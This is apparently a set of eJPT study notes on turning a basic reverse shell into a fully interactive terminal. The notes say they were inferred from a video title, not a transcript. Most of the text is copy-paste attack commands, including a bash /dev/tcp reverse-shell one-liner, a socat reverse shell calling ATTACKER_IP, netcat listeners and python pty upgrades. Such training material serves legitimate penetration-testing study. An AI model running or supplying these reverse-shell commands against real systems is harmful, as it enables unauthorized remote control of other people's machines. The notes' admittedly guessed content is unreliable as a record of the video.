# Upgrading Non-Interactive Shells (eJPT) — Summary Notes

Note: The transcript wasn’t provided. The following is a careful, practical summary inferred from the video title and common eJPT techniques for upgrading dumb shells (e.g., basic netcat/web shells) into fully interactive TTYs.

## What the video covers (Introduction / big picture)
- Why initial shells (e.g., netcat reverse shells) are often non-interactive: no job control, no tab-completion, broken arrows/backspace, sudo/su won’t prompt, editors fail.
- How to “upgrade” those shells to a proper TTY that supports interactive features and tools.
- Multiple methods to stabilize shells:
  - Python pty.spawn
  - script utility
  - socat for a fully interactive TTY
  - rlwrap for line editing/history on the listener
  - stty/reset/env tuning to fix terminal behavior

## Flow (ordered)
1. Catch the reverse shell (preferably with rlwrap).
2. Identify it’s non-interactive: commands break, no tab, sudo complains.
3. Try Python TTY spawn (python3, then python).
4. Suspend shell with Ctrl+Z; fix local terminal; foreground.
5. Reset terminal and set env vars on the target (TERM, SHELL); adjust rows/columns.
6. If Python not available, try script-based TTY.
7. If you can, use socat for a robust TTY.
8. Verify: arrows, Ctrl+C, sudo/su prompts, editors.

## Tools highlighted
- nc (netcat)
- rlwrap
- python3/python (pty module)
- script (/usr/bin/script)
- socat
- stty, reset, export (environment adjustments)
- bash/sh

## Typical command walkthrough (detailed, copy-paste friendly)

Quick check (on the target shell):
```
whoami
id
uname -a
which python3 || which python || which script || which socat
tty
```

1) Listener with history and better line-editing (attacker):
```
rlwrap -cAr nc -lvnp 4444
```

2) If you need a one-liner reverse shell (target):
```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

3) Upgrade with Python pty (target, after you have a shell):
- Prefer python3:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Fallback to python:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

4) Fix local terminal and foreground the session (attacker):
- Press: Ctrl+Z to background the shell
- Then run:
```
stty raw -echo; fg
```
- When it returns, if needed, type:
```
reset
```

5) Set terminal environment and size (target):
```
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 50 columns 120
```
- Tip: get your terminal size on attacker and mirror it:
  - On attacker: `stty size` (e.g., 50 120)
  - On target: `stty rows 50 columns 120`

6) If Python is unavailable: use script (target):
- Try:
```
script -q /dev/null -c bash
```
- If that fails, alternative forms:
```
script -qc bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
SHELL=/bin/bash script -q /dev/null
```

7) Fully interactive TTY via socat (best quality if available):

- Attacker (in a terminal with a TTY):
```
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
```

- Target (from current shell):
```
socat TCP:ATTACKER_IP:4444 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

8) Validate upgrade (target):
```
tty
echo $TERM
stty -a
sudo -l 2>/dev/null || echo "sudo may still require a proper TTY"
```
- Test arrows, Ctrl+C, tab-completion, editors (vi/nano).

## Practical tips
- rlwrap improves netcat listeners significantly for quick wins.
- Use python3 first; many modern systems lack python2 by default.
- If Ctrl+C kills your session, try after doing stty raw -echo and reset. You can also restore sane behavior with `stty sane`.
- If backspace/arrows are broken, re-run `stty raw -echo; fg` and then `reset`, set `TERM`, and `stty rows/columns`.
- sudo/su often need a TTY; the pty.spawn or script method generally fixes “no tty present” errors.
- If socat isn’t installed on target, consider uploading a static socat binary for the target architecture (if allowed).
- When asked by reset for terminal type, xterm or xterm-256color is usually safe.

## Minimal cheat sheet (one-screen flow)
```
# Attacker
rlwrap -cAr nc -lvnp 4444

# Target (already have a basic reverse shell)
python3 -c 'import pty; pty.spawn("/bin/bash")' \
  || python -c 'import pty; pty.spawn("/bin/bash")' \
  || script -q /dev/null -c bash

# Attacker
^Z
stty raw -echo; fg
# then on target:
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 50 columns 120   # adjust to your terminal

# Socat (optional, best quality)
# Attacker:
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
# Target:
socat TCP:ATTACKER_IP:4444 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

## Summary
This module shows how to turn an unstable, non-interactive reverse shell into a stable, fully interactive TTY suitable for privilege escalation and interactive tooling. Start with a better listener (rlwrap), upgrade via Python pty.spawn or script, tune terminal settings (stty/reset/TERM), and use socat for the most reliable experience when available. These steps resolve broken line editing, enable job control, and allow sudo/su and editors to work correctly during engagements.